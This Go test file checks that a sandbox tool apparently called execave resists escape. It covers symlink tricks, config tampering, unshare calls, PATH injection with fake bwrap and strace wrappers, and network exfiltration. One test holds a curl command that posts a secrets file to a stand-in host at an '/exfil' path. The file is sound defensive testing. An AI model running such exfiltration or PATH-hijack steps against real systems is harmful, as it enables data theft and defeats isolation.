package e2e_test

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func Test_PreventingSandboxEscape_SymlinkEscapeLinkInsideMountPointsOutsideRules(t *testing.T) {
	// A symlink inside an accessible directory pointing to a path outside the rules is denied:
	// bwrap only mounts paths covered by rules, so the symlink target is absent from the sandbox.

	s := newScenario(t)
	public := s.givenDir("public")
	secret := s.givenDir("secret")
	secret.file("shadow.txt", "secret data")
	escapeLink := public.join("escape-link")
	s.givenSymlink(secret.join("shadow.txt"), escapeLink)

	s.givenRules("fs:rw:" + public.String())

	s.whenRun("cat", escapeLink)

	s.thenExitCodeNonZero()
	s.thenStderrContains("escape-link: No such file or directory")
}

func Test_PreventingSandboxEscape_SymlinkChainBrokenAtDeniedIntermediateHop(t *testing.T) {
	// A symlink chain stops at a denied intermediate hop: the final target is never accessed
	// or logged, even if it would be accessible if reached directly.
	s := newScenario(t)
	mount := s.givenDir("mount")
	nomatch := s.givenDir("nomatch")

	secretFile := mount.file("secret.txt", "secret")
	hop2 := nomatch.join("hop2")
	s.givenSymlink(secretFile, hop2)
	hop1 := mount.join("hop1")
	s.givenSymlink(hop2, hop1)

	s.givenRules("fs:ro:" + mount.String())

	s.whenRunTextLogWithFlags([]string{"--show-allowed"}, "cat", hop1)

	s.thenExitCodeNonZero()
	s.thenStderrHasEntry("READ", mount.rel("hop1"), "OK", "ro:"+mount.String())
	s.thenStderrHasEntry("READ", nomatch.rel("hop2"), "DENY", "no-matching-rule")
	s.thenStderrNotContains(secretFile)
}

func Test_PreventingSandboxEscape_ConfigFileProtection(t *testing.T) {
	t.Run("config in writable dir forced read-only", func(t *testing.T) {
		// The config file is forced read-only inside the sandbox even when its parent
		// directory has a writable rule. Writes to the config are denied; reads and
		// writes to sibling files succeed normally.

		s := newScenario(t)
		work := s.givenDir("work")
		otherFile := work.file("other.txt", "other data")
		configPath := work.join("execave.toml")

		s.givenRulesInDir(work.String(), "fs:rw:"+work.String())

		s.whenRun("sh", "-c", "echo '{}' > "+configPath)
		s.thenExitCodeNonZero()
		s.thenStderrContains("execave.toml: Read-only file system")

		s.whenRun("cat", configPath)
		s.thenExitCode(0)

		s.whenRun("sh", "-c", "echo modified >> "+otherFile)
		s.thenExitCode(0)
	})

	t.Run("base config in extends chain also forced read-only", func(t *testing.T) {
		// Both the root config and any base configs from an extends chain are forced
		// read-only inside the sandbox, even when their parent directory has a writable rule.

		s := newScenario(t)
		work := s.givenDir("work")
		basePath := work.join("base.toml")
		childPath := work.join("execave.toml")

		err := os.WriteFile(basePath, tomlConfig(systemPaths()), 0o600)
		require.NoError(t, err)

		childContent := "extends = [\"base.toml\"]\n" + string(tomlConfig([]string{"fs:rw:" + work.String()}))
		err = os.WriteFile(childPath, []byte(childContent), 0o600)
		require.NoError(t, err)

		s.configPath = childPath
		s.configDir = work.String()

		s.whenRun("sh", "-c", "echo '{}' > "+basePath)
		s.thenExitCodeNonZero()
		s.thenStderrContains("base.toml: Read-only file system")

		s.whenRun("sh", "-c", "echo '{}' > "+childPath)
		s.thenExitCodeNonZero()
		s.thenStderrContains("execave.toml: Read-only file system")
	})

	t.Run("config outside rules stays invisible", func(t *testing.T) {
		// When the config file's directory has no fs rule, the config file is not
		// mounted in the sandbox and is invisible to the sandboxed process.

		s := newScenario(t)
		configDir := s.givenDir("config")
		work := s.givenDir("work")
		configPath := configDir.join("execave.toml")

		s.givenRulesInDir(configDir.String(), "fs:rw:"+work.String())

		s.whenRun("cat", configPath)
		s.thenExitCodeNonZero()
		s.thenStderrContains("No such file")
	})
}

func Test_PreventingSandboxEscape_DataExfiltrationViaNetworkDenied(t *testing.T) {
	// A sandboxed command with fs access to sensitive files and a single allowed HTTPS
	// endpoint cannot exfiltrate data to unauthorized destinations: the proxy denies
	// CONNECT requests that do not match the allowlist.
	s := newScenario(t)
	s.givenCurl()

	data := s.givenDir("data")
	secretFile := data.file("secrets.txt", "sensitive data")

	srv := s.givenHTTPSServer("TRUSTED_API")

	s.givenRules(
		"fs:ro:"+data.String(),
		"net:http:"+srv.addr(),
	)

	s.whenRun("curl", "-sk", fmt.Sprintf("https://%s/", srv.hostPort()))

	s.thenExitCode(0)
	s.thenStdoutContains("TRUSTED_API")

	s.whenRun("curl", "-sk", "--max-time", "5",
		"-d", "@"+secretFile,
		"https://192.0.2.1:443/exfil")

	s.thenExitCodeNonZero()
}

func Test_PreventingSandboxEscape_SymlinkToAncestorOfManagedPathDenied(t *testing.T) {
	// A symlink pointing to an ancestor of a managed path (e.g., / which contains /tmp)
	// should be flagged when the resolved path traverses into the managed subtree.
	s := newScenario(t)
	data := s.givenDir("data")
	s.givenRules("fs:rw:" + data.String())

	linkPath := data.join("root-link")
	s.whenRunTextLog("", "sh", "-c",
		"echo test > /tmp/target.txt && ln -s / "+linkPath+" && cat "+linkPath+"/tmp/target.txt")

	s.thenExitCode(0)
	s.thenStderrHasEntry("READ", data.rel("root-link"), "UNKNOWN", "symlink-target-unresolvable")
}

func Test_PreventingSandboxEscape_SymlinkLoopHitsDepthLimit(t *testing.T) {
	// A symlink loop is detected and denied: the monitor resolves symlinks hop by hop
	// and denies access after hitting the 40-link depth limit (matching Linux's MAXSYMLINKS),
	// logging the reason as symlink-depth-limit-exceeded.

	cases := []struct {
		name  string
		setup func(s *scenario, mount testDir) string
	}{
		{
			"two-node loop",
			func(s *scenario, mount testDir) string {
				loopA := mount.join("loop-a")
				loopB := mount.join("loop-b")
				s.givenSymlink(loopB, loopA)
				s.givenSymlink(loopA, loopB)
				return loopA
			},
		},
		{
			"self-referential",
			func(s *scenario, mount testDir) string {
				loopA := mount.join("loop-a")
				s.givenSymlink(loopA, loopA)
				return loopA
			},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			s := newScenario(t)
			mount := s.givenDir("mount")
			link := tc.setup(s, mount)

			s.givenRules("fs:ro:" + mount.String())

			s.whenRunTextLog("", "cat", link)

			s.thenExitCodeNonZero()
			s.thenStderrContains("loop-a: Too many levels of symbolic links")
			s.thenStderrHasEntry("DENY", "symlink-depth-limit-exceeded")
		})
	}
}

func Test_PreventingSandboxEscape_PATHInjectionViaSymlinkToBwrapRejected(t *testing.T) {
	// A non-root-owned symlink to the real bwrap placed first in PATH is rejected:
	// execave checks ownership of the path as found by LookPath (the symlink itself),
	// not the resolved target, so attacker-controlled PATH entries cannot redirect bwrap.
	realBwrapPath, err := exec.LookPath("bwrap")
	require.NoError(t, err)

	fakeDir := t.TempDir()
	symlinkBwrap := filepath.Join(fakeDir, "bwrap")
	require.NoError(t, os.Symlink(realBwrapPath, symlinkBwrap))
	t.Setenv("PATH", fakeDir+":"+os.Getenv("PATH"))

	configPath := writeConfig(t, systemPaths())
	result := runExecave(t, "", "--config", configPath, "--", "true")

	assert.NotEqual(t, 0, result.ExitCode)
	assert.Contains(t, result.Stderr, "not owned by root")
}

func Test_PreventingSandboxEscape_PATHInjectionViaFakeBwrapBinary(t *testing.T) {
	// A non-root-owned bwrap executable placed first in PATH is rejected: execave validates
	// binary ownership before use, so an attacker-controlled executable cannot replace the
	// real sandbox.
	failIfNoBwrap(t)

	fakeDir := t.TempDir()
	fakeBwrap := filepath.Join(fakeDir, "bwrap")
	require.NoError(t, os.WriteFile(fakeBwrap, []byte("#!/bin/sh\nexec /bin/sh \"$@\""), 0o755)) // #nosec G306 -- test binary needs execute permission

	// Put fake bwrap first in PATH so exec.LookPath finds it before the real one.
	t.Setenv("PATH", fakeDir+":"+os.Getenv("PATH"))

	configPath := writeConfig(t, []string{"fs:ro:/usr"})
	result := runExecave(t, "", "--config", configPath, "--", "true")

	assert.NotEqual(t, 0, result.ExitCode)
	assert.Contains(t, result.Stderr, "not owned by root")
}

func Test_PreventingSandboxEscape_NamespaceEscapeViaUnshareBlockedBySeccomp(t *testing.T) {
	// The seccomp filter blocks the unshare syscall with EPERM, preventing namespace
	// escape regardless of which namespace type the command requests.
	cases := []struct {
		name string
		flag string
	}{
		{"user namespace", "--user"},
		{"network namespace", "--net"},
		{"mount namespace", "--mount"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			s := newScenario(t)
			s.givenRules()

			s.whenRun("unshare", tc.flag, "true")

			s.thenExitCodeNonZero()
			s.thenStderrContains("Operation not permitted")
		})
	}
}

func Test_PreventingSandboxEscape_PATHInjectionViaFakeStraceBinary(t *testing.T) {
	// execave rejects a non-root-owned strace binary found earlier in PATH when monitoring
	// is active, because strace runs outside the sandbox with full host access. Without
	// monitoring, a fake strace in PATH is harmless — strace is never invoked.

	cases := []struct {
		name  string
		setup func(t *testing.T, fakeDir string)
	}{
		{
			"fake executable",
			func(t *testing.T, fakeDir string) {
				t.Helper()
				fakeStrace := filepath.Join(fakeDir, "strace")
				require.NoError(t, os.WriteFile(fakeStrace, []byte("#!/bin/sh\nexec /bin/sh \"$@\""), 0o755)) // #nosec G306 -- test binary needs execute permission
			},
		},
		{
			"symlink to real strace",
			func(t *testing.T, fakeDir string) {
				t.Helper()
				// Look up real strace before PATH is modified.
				realStrace, err := exec.LookPath("strace")
				require.NoError(t, err)
				require.NoError(t, os.Symlink(realStrace, filepath.Join(fakeDir, "strace")))
			},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			fakeDir := t.TempDir()
			tc.setup(t, fakeDir)
			t.Setenv("PATH", fakeDir+":"+os.Getenv("PATH"))

			configPath := writeConfig(t, []string{"fs:ro:/usr"})
			result := runExecave(t, "", "--config", configPath, "monitor", "--", "true")

			assert.NotEqual(t, 0, result.ExitCode)
			assert.Contains(t, result.Stderr, "not owned by root")
		})
	}

	// Without monitoring, strace is never invoked; a fake strace in PATH is irrelevant.
	t.Run("no monitoring", func(t *testing.T) {
		failIfNoBwrap(t)

		fakeDir := t.TempDir()
		fakeStrace := filepath.Join(fakeDir, "strace")
		require.NoError(t, os.WriteFile(fakeStrace, []byte("#!/bin/sh\nexec /bin/sh \"$@\""), 0o755)) // #nosec G306 -- test binary needs execute permission
		t.Setenv("PATH", fakeDir+":"+os.Getenv("PATH"))

		configPath := writeConfig(t, systemPaths())
		result := runExecave(t, "", "--config", configPath, "--", "true")

		assert.Equal(t, 0, result.ExitCode)
	})
}
